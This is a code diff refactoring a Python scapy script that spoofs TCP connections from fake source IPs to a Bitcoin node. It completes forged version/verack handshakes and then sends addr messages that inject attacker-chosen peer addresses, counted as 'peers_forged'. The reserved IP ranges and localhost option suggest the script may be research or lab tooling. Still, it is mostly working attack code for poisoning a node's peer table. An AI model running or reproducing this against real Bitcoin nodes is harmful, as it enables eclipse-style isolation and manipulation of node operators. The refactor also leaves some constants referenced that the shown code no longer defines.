@@ -5,39 +5,18 @@ from bitcoin.net import CAddress
 
 from scapy.all import ETH_P_ALL, IP, MTU, send, select, sniff, TCP, UDP, Raw, conf, L3RawSocket, sr1, sendp
 
-
 from bitcoin.messages import msg_version, msg_verack, msg_addr
 
-
-addrs_sent = 0
-
-# While python dictionaries are threading-safe we perform multiple non-atomic 
-#  operations. For ease of debugging we use a lock to ensure threads do not
-#  perform interleaved operations.
-class LockableDict(dict):
-    def __init__(self):
-        self.lock = threading.Lock()
-
-CONN_STATUS = LockableDict()
-
-
-IPs_TO_SPOOF = {
-    '230.5.23.0': ['252.0.0.1', '252.1.0.10'],
-    '230.5.23.1': ['252.0.0.2', '252.1.0.9'],
-    '230.5.23.2': ['252.0.0.3', '252.1.0.8'],
-    '230.5.23.3': ['252.0.0.4', '252.1.0.7'],
-    '230.5.23.4': ['252.0.0.5', '252.1.0.6']
-}
-PORT = 8333
-
-
-
 class Sniff_And_Respond:
-    def __init__(s, iface, target_ip, dport, sport):
+    def __init__(s, iface, target_ip, dport, sport, ips, connections):
         s.iface = iface
         s.target_ip = target_ip
         s.dport = dport
         s.sport = sport
+        s.ips = ips
+        s.connections = connections
+
+        s.peers_forged = 0
 
     # Bitcoin utility functions
     def btc_add_magic(s, pkt):
@@ -55,8 +34,8 @@ class Sniff_And_Respond:
         addrs = []
         for i in str_addrs:
             addr = CAddress()
-            addr.port = PORT
-            addr.nTime =   int(time.time()) #- timefloor + replacementtimefloor
+            addr.port = s.dport
+            addr.nTime = int(time.time()) #- timefloor + replacementtimefloor
             addr.ip = i
             addrs.append( addr )
 
@@ -68,11 +47,11 @@ class Sniff_And_Respond:
     def btc_version_pkt(s, spoofed_ip):
         c = msg_version()
         c.nVersion = 70002
-        c.addrTo.ip = "127.0.0.1" #TODO: fix this so that ip is not hardcoded TARGET_IP
-        c.addrTo.port = 8333 #TODO: fix this so port is not hardcoded PORT
+        c.addrTo.ip = s.target_ip 
+        c.addrTo.port = s.dport
 
         c.addrFrom.ip = spoofed_ip
-        c.addrFrom.port = 8333 #TODO: fix this so port is not hardcoded PORT
+        c.addrFrom.port = s.sport
 
         return s.btc_add_magic(c)
 
@@ -88,12 +67,12 @@ class Sniff_And_Respond:
         start = time.time()
 
         if pkt[IP].src == s.target_ip:
-            with CONN_STATUS.lock:
-                if pkt[IP].dst in CONN_STATUS:
-                    print "pkt[IP].dst", pkt[IP].dst,   CONN_STATUS[ pkt[IP].dst ], pkt[TCP].flags
+            with s.connections.lock:
+                if pkt[IP].dst in s.connections:
+                    print "pkt[IP].dst", pkt[IP].dst, s.connections[ pkt[IP].dst ], pkt[TCP].flags
 
                     # This packet is both from the target and intented for us.                
-                    if pkt[TCP].flags == 0x12 and CONN_STATUS[ pkt[IP].dst ] == "sent": #SYNACK received
+                    if pkt[TCP].flags == 0x12 and s.connections[ pkt[IP].dst ] == "sent": #SYNACK received
                         #TCP connection established 
 
                         #Send version pkt #should this seqence number increase by the size of the previous pkt??
@@ -101,9 +80,9 @@ class Sniff_And_Respond:
                         p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=pkt.seq+1,seq=pkt.ack)/s.btc_version_pkt(pkt[IP].dst)
                         send(p, verbose=False)
 
-                        print CONN_STATUS, pkt[IP].dst, pkt[IP].dst in CONN_STATUS
+                        print s.connections, pkt[IP].dst, pkt[IP].dst in s.connections
                         print "SYNACK"
-                        CONN_STATUS[pkt[IP].dst] = "synack"
+                        s.connections[pkt[IP].dst] = "synack"
 
                     elif pkt[TCP].flags == 0x10: #ACK
                         pass
@@ -111,11 +90,11 @@ class Sniff_And_Respond:
                     elif pkt[TCP].flags == 0x18: #PSH ACK - they are sending us data
                         payload = pkt[TCP].payload.load
 
-                        if payload[4:11] == "version" and CONN_STATUS[pkt[IP].dst] == "synack":
+                        if payload[4:11] == "version" and s.connections[pkt[IP].dst] == "synack":
 
-                            CONN_STATUS[pkt[IP].dst] = "version"
+                            s.connections[pkt[IP].dst] = "version"
 
-                            if len( IPs_TO_SPOOF[ pkt[IP].dst] ) == 0:
+                            if len( s.ips[pkt[IP].dst] ) == 0:
                                 #RST - if we have no addrs to share
                                 p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PAR',ack=(pkt.seq+len(payload)),seq=pkt.ack)/s.btc_verack_pkt()
                                 send(p, verbose=False)
@@ -125,24 +104,23 @@ class Sniff_And_Respond:
                                 send(p, verbose=False)
 
 
-                        elif payload[4:10] == "verack" and CONN_STATUS[pkt[IP].dst] == "version": 
+                        elif payload[4:10] == "verack" and s.connections[pkt[IP].dst] == "version": 
                             # verack received we are connected 
                             print "done"
 
-                            CONN_STATUS[pkt[IP].dst] = "done"
+                            s.connections[pkt[IP].dst] = "done"
 
-                            if len( IPs_TO_SPOOF[pkt[IP].dst] ) > 0:
+                            if len( s.ips[pkt[IP].dst] ) > 0:
                                 # print "sending addresses"
-                                addrs = s.btc_addr_pkt(IPs_TO_SPOOF[pkt[IP].dst])
+                                addrs = s.btc_addr_pkt(s.ips[pkt[IP].dst])
                                 p= IP(dst=target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=(pkt.seq+len(payload)),seq=pkt.ack)/addrs
                                 send(p, verbose=False)
 
-                                global addrs_sent
-                                addrs_sent+=1
-                                print addrs_sent, pkt[IP].dst
+                                s.peers_forged+=1
+                                print s.peers_forged, pkt[IP].dst
                                 time.sleep(4)
 
-                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='R',seq=pkt.ack+len(s.btc_addr_pkt(IPs_TO_SPOOF[pkt[IP].dst])))
+                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='R',seq=pkt.ack+len(s.btc_addr_pkt(s.ips[pkt[IP].dst])))
                                 send(p, verbose=False)
 
                             else:
@@ -158,12 +136,13 @@ class Sniff_And_Respond:
 
 
 class ConnectionInitiator(threading.Thread):
-     def __init__(s, iface, ips, target_ip, dport, sport):
+     def __init__(s, iface, target_ip, dport, sport, ips, connections):
         s.iface = iface
-        s.ips = ips
         s.target_ip = target_ip
         s.dport = dport
         s.sport = sport
+        s.ips = ips
+        s.connections = connections
 
         super(ConnectionInitiator, s).__init__()
 
@@ -210,8 +189,8 @@ class ConnectionInitiator(threading.Thread):
             send(p, verbose=True, iface=s.iface) # doesn't work if this is set to loopback
             # iface must be set to current internet connection
 
-            with CONN_STATUS.lock:
-                CONN_STATUS[spoofed_ip] = "sent"
+            with s.connections.lock:
+                s.connections[spoofed_ip] = "sent"
 
 
             LAST_PACKET_SENT = int(time.time()*1000) 
@@ -238,15 +217,29 @@ if localhost:
     target_ip  = "127.0.0.1"
 
 dport = 8333 #parameter
-sport = 28333
+sport = 28333 
 
-ips_to_spoof = IPs_TO_SPOOF
+ips = {
+    '230.5.23.0': ['252.0.0.1', '252.1.0.10'],
+    '230.5.23.1': ['252.0.0.2', '252.1.0.9'],
+    '230.5.23.2': ['252.0.0.3', '252.1.0.8'],
+    '230.5.23.3': ['252.0.0.4', '252.1.0.7'],
+    '230.5.23.4': ['252.0.0.5', '252.1.0.6']
+}
+
+# While python dictionaries are threading-safe we perform multiple non-atomic 
+#  operations. For ease of debugging we use a lock to ensure threads do not
+#  perform interleaved operations.
+class LockableDict(dict):
+    def __init__(self):
+        self.lock = threading.Lock()
+connections = LockableDict()
 
 #TODO: this should not be a thread
-conn_thread = ConnectionInitiator(iface, ips_to_spoof, target_ip, dport, sport)
+conn_thread = ConnectionInitiator(iface, target_ip, dport, sport, ips, connections)
 conn_thread.daemon = True
 conn_thread.start()
 
 #TODO: this should be a thread
-on_path_tap = Sniff_And_Respond(iface, target_ip, dport, sport)
+on_path_tap = Sniff_And_Respond(iface, target_ip, dport, sport, ips, connections)
 on_path_tap.start()
